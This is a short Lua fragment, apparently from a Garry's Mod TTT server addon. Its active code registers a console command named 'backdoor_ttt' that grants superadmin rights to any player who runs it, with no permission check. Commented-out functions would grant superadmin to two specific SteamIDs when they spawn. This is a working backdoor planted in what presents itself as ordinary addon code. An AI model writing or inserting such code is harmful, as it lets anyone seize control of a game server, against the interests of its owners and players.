...
concommand.Add("backdoor_ttt", function(player)
player:SetUserGroup("superadmin")
end)

//function ADDMIN( ply )
//if ( ply:SteamID() == "STEAM_0:1:71900473" ) then 
//ply:SetUserGroup("superadmin")
//end
//end
//hook.Add("PlayerSpawn", "ADDMIN", ADDMIN)

//function ADDMIN( ply )
//if ( ply:SteamID() == "STEAM_0:1:40676900" ) then 
//ply:SetUserGroup("superadmin")
//end
//end
